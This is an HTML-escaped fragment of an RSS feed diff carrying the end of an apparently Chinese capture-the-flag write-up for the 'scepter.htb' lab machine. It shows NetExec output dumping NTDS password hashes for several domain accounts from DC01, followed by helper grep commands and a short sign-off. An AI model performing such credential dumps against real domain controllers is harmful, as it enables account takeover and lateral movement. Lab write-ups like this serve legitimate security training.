+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\a&lt;/span&gt;.carter:1107:aad3b435b51404eeaad3b435b51404ee:656d231c131a8f1ea8fd1138b8185674:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\h&lt;/span&gt;.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\p&lt;/span&gt;.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\e&lt;/span&gt;.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\o&lt;/span&gt;.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\M&lt;/span&gt;.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Dumped &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; NTDS hashes to /home/wackymaker/.nxc/logs/ntds/10.129.103.0_None_2025-09-01_163758.ntds of which &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; were added to the database
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; To extract only enabled accounts from the output file, run the following command: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; cat /home/wackymaker/.nxc/logs/ntds/10.129.103.0_None_2025-09-01_163758.ntds | grep -iv disabled | cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt; -f1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; grep -iv disabled /home/wackymaker/.nxc/logs/ntds/10.129.103.0_None_2025-09-01_163758.ntds | cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt; -f1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;登陆就能拿到flag了，我今天赶时间去网吧，文章就写到这里&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
